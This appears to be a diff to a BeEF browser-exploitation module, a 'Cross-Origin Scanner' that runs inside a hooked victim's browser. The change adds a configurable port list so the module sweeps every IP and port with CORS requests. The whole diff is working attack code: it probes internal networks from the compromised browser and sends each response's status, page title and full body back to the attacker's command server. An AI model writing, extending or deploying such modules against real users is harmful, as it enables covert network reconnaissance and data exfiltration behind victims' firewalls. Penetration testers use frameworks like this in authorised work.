@@ -8,12 +8,18 @@ beef.execute(function() {
 
   var ips = new Array();
   var ipRange = "<%= @ipRange %>";
+  var ports   = "<%= @ports %>";
   var threads = "<%= @threads %>";
   var wait = 2;
 
   if(!beef.browser.hasCors()) {
     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS');
     return;
+  }
+
+  // set target ports
+  if (ports != null) {
+    ports = ports.split(',');
   }
 
   // set target IP addresses
@@ -84,7 +90,7 @@ beef.execute(function() {
 
   }
 
-  beef.debug("[Cross-Origin Scanner] Starting CORS scan ("+ips.length+" URLs / "+threads+" workers)");
+  beef.debug("[Cross-Origin Scanner] Starting CORS scan ("+(ips.length*ports.length)+" URLs / "+threads+" workers)");
 
   // create worker queue
   var workers = new Array();
@@ -94,19 +100,20 @@ beef.execute(function() {
 
   // send CORS request to each IP
   var proto = 'http';
-  var port = 80;
   for (var i=0; i < ips.length; i++) {
     var worker = workers[i % threads];
-    var url = proto + '://' + ips[i] + ':' + port;
-    worker.queue('beef.net.cors.request(' +
+    for (var p=0; p < ports.length; p++) {
+      var url = proto + '://' + ips[i] + ':' + ports[p];
+      worker.queue('beef.net.cors.request(' +
       '"GET", "'+url+'", "", function(response) {' +
        'if (response != null && response["status"] != 0) {' +
         'beef.debug("[Cross-Origin Scanner] Received response from '+url+': " + JSON.stringify(response));' +
         'var title = response["body"].match("<title>(.*?)<\\/title>"); if (title != null) title = title[1];' +
-        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ips[i]+'&port='+port+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response));' +
+        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response));' +
        '}' +
       '});'
-    );
+      );
+    }
   }
 
 });
